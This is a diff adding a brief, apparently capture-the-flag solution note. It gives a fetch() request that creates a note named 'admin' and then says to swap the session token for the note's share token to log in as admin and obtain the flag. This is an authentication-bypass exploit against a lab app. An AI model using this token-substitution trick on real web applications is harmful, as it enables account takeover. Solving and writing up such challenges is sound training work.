@@ -1,0 +1,15 @@
+create note with:
+
+fetch("/notes", {
+    method: "POST",
+    body: JSON.stringify({
+      name: "admin",
+      content: "r3",
+    }),
+    headers: {
+      "Content-type": "application/json; charset=UTF-8"
+    }
+  })
+
+
+replace your session token with note share token to log in as admin and get the flag
